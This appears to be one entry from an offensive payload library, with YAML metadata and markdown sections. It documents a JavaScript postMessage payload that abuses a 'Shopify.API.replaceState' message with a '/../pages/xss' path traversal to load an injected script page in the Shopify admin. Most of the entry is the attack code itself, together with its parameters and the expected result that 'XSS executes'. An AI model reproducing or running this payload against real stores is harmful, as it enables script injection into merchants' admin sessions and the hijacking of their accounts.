---
id: cmd-004
data: >-
  data
  =JSON.stringify({message:'Shopify.API.replaceState',data:{pathname:"/../pages/xss"}});ctx.postMessage(data)
tags:
  - replace-state
type: command
output: 'Replaces current route in admin, loads XSS page'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.366Z'
verified: false
validated: true
submitted: true
---
# attack-trigger-replacestate-xss

## Command

```javascript
const data = JSON.stringify({message:'Shopify.API.replaceState',data:{pathname:"/../pages/xss"}});
ctx.postMessage(data);
```

## Description

postMessage variant using replaceState to trigger path traversal and load XSS without history push.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pathname | "/../pages/xss" traversal | Yes |

## Examples

### Basic Usage

```javascript
JSON.stringify({message:'Shopify.API.replaceState',data:{pathname:"/../pages/xss"}})
```

### Advanced Usage

```javascript
ctx.postMessage(data)
```

## Expected Output

Admin route replaces to /pages/xss; XSS executes.

## Related

- [[Related Procedure: Alternative-Trigger-via-replaceState]]
